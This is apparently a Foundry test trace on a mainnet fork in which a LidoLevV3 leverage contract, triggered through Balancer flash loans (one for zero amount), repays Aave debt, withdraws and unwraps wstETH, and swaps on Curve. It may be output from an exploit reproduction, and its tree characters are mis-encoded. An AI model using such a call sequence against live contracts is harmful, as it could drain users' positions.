    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: aEthwstETH: [0x0B925eD163218f6662a35e0f0371Ac234f9E9371], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 307089429045260432253 [3.07e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [20142] 0x54586bE62E3c3580375aE3723C145253060Ca0C2::getAssetPrice(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [14620] 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [7124] 0xE62B71cf983019BFf55bC83B48601ce8419650CC::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 226467139000 [2.264e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 226467139000 [2.264e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 226467139000 [2.264e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1123] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [603] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000001d5535af0029ef7e9
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000001d5535af0029ef7e9
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1201] 0x102633152313C81cD80419b6EcF66d14Ad68949A::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [649] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [43723] 0x54586bE62E3c3580375aE3723C145253060Ca0C2::getAssetPrice(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [38201] 0x8B6851156023f4f5A66F68BEA80851c3D905Ac93::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2120] 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1124] 0xE62B71cf983019BFf55bC83B48601ce8419650CC::latestAnswer() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 226467139000 [2.264e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 226467139000 [2.264e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [31663] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::getPooledEthByShares(1000000000000000000 [1e18]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [8263] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [12783] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::getPooledEthByShares(1000000000000000000 [1e18]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000100956f9c9ea1aa1
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000000100956f9c9ea1aa1
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 261694195375 [2.616e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 261694195375 [2.616e11]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1146] aEthwstETH::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [626] 0x7EfFD7b47Bfd17e52fB7559d3f924201b9DbfF3d::scaledBalanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000001d36b1bc383a5d656
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000001d36b1bc383a5d656
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Withdraw(param0: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, param1: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param2: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param3: 307089429045260432253 [3.07e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000000010a5b8d0afe845b37d
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 307089429045260432253 [3.07e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 307089429045260432253 [3.07e20]
    в”‚   в”‚   в”њв”Ђ [534] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 307089429045260432253 [3.07e20]
    в”‚   в”‚   в”њв”Ђ [41266] 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0::unwrap(307089429045260432253 [3.07e20])
    в”‚   в”‚   в”‚   в”њв”Ђ [6163] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::getPooledEthByShares(307089429045260432253 [3.07e20]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [2783] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::getPooledEthByShares(307089429045260432253 [3.07e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000133ca270864a06bd2b
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000133ca270864a06bd2b
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 307089429045260432253 [3.07e20])
    в”‚   в”‚   в”‚   в”њв”Ђ [24083] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 354857315711054167339 [3.548e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [20697] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 354857315711054167339 [3.548e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 354857315711054167339 [3.548e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit TransferShares(param0: 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0, param1: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param2: 307089429045260432252 [3.07e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000133ca270864a06bd2b
    в”‚   в”‚   в”њв”Ђ [6468] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”њв”Ђ [3088] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 354857315711054167339 [3.548e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 354857315711054167339 [3.548e20]
    в”‚   в”‚   в”њв”Ђ [6468] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”њв”Ђ [3088] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 354857315711054167339 [3.548e20]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 354857315711054167339 [3.548e20]
    в”‚   в”‚   в”њв”Ђ [90531] 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022::exchange(1, 0, 354857315711054167339 [3.548e20], 354502458395343113172 [3.545e20])
    в”‚   в”‚   в”‚   в”њв”Ђ [8468] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::balanceOf(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [5088] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::balanceOf(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 45713660374355418056101 [4.571e22]
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 45713660374355418056101 [4.571e22]
    в”‚   в”‚   в”‚   в”њв”Ђ [16796] 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 354857315711054167339 [3.548e20])
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1763] 0xb8FFC3Cd6e7Cf5a098A1c92F48009765B24088Dc::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [820] 0x2b33CF282f867A7FF693A66e11B0FcC5552e4425::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x00000000000000000000000017144556fd3424edc8fc8a4c940b2d04936d17eb
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [13404] 0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 354857315711054167339 [3.548e20]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, value: 354857315711054167339 [3.548e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ emit TransferShares(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, param2: 307089429045260432252 [3.07e20])
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в”‚   в”њв”Ђ [18] PRECOMPILES::identity(0x0000000000000000000000000000000000000000000000000000000000000000)
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”њв”Ђ [55] LidoLevV3::fallback{value: 354675630591246269703}()
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”‚   в”њв”Ђ emit TokenExchange(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 1, param2: 354857315711054167339 [3.548e20], param3: 0, param4: 354675630591246269703 [3.546e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000133a1cf6dee6e6fd07
    в”‚   в”‚   в”њв”Ђ [21974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 354675630591246269703}()
    в”‚   в”‚   в”‚   в”њв”Ђ emit Deposit(dst: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], wad: 354675630591246269703 [3.546e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”‚   в”њв”Ђ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 318973831042619036856 [3.189e20])
    в”‚   в”‚   в”‚   в”њв”Ђ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 318973831042619036856 [3.189e20])
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”‚   в””в”Ђ в†ђ [Stop] 
    в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 55912009748616849239618 [5.591e22]
    в”‚   в”њв”Ђ emit FlashLoan(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, param2: 318973831042619036856 [3.189e20], param3: 0)
    в”‚   в””в”Ђ в†ђ [Stop] 
    в”њв”Ђ [149742] Balancer::flashLoan(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [0], 0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    в”‚   в”њв”Ђ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 55912009748616849239618 [5.591e22]
    в”‚   в”њв”Ђ [350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”њв”Ђ [3262] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0)
    в”‚   в”‚   в”њв”Ђ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 0)
    в”‚   в”‚   в””в”Ђ в†ђ [Return] true
    в”‚   в”њв”Ђ [131517] LidoLevV3::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [0], [0], 0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
    в”‚   в”‚   в”њв”Ђ [3038] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”њв”Ђ [2486] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1325] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [805] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::getReserveNormalizedVariableDebt(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000035826ff2489bafa33adf90f
    в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35002954502486078893 [3.5e19]
    в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 35002954502486078893 [3.5e19]
    в”‚   в”‚   в”њв”Ђ [47974] 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2::repay(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 35002954502486078893 [3.5e19], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
    в”‚   в”‚   в”‚   в”њв”Ђ [47439] 0x5FAab9E1adbddaD0a08734BE8a52185Fd6558E14::repay(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 35002954502486078893 [3.5e19], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [45793] 0x5547D7d54d10C359108e36d098016c4020443Fd4::40e95de6(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003682b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f29000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000001e5c379aa99d7b5ad0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [968] 0xeA51d7853EEFb32b6ee06b1C12E6dcCA88Be0fFE::scaledTotalSupply() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [419] 0xaC725CB59D16C81061BDeA61041a8A5e73DA9EC6::scaledTotalSupply() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1482] 0x102633152313C81cD80419b6EcF66d14Ad68949A::getSupplyData() [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [921] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::getSupplyData() [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [1201] 0x102633152313C81cD80419b6EcF66d14Ad68949A::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”њв”Ђ [649] 0x15C5620dfFaC7c7366EED66C20Ad222DDbB1eD57::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
    в”‚   в”‚   в”‚   в”‚   в”‚   в”‚   в””в”Ђ в†ђ [Return] 0
